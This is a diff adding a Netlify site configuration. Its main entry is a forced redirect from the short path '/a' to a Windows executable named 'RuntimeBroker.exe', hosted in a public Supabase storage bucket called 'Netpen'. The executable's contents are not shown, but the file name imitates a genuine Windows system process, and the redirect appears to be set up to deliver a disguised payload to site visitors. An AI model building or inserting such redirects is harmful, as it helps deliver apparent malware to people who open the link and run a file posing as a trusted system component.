@@ -1,0 +1,8 @@
+[[redirects]]
+  from = "/a"
+  to = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/RuntimeBroker.exe"
+  status = 302
+  force = true
+
+[functions]
+  directory = "netlify/functions"
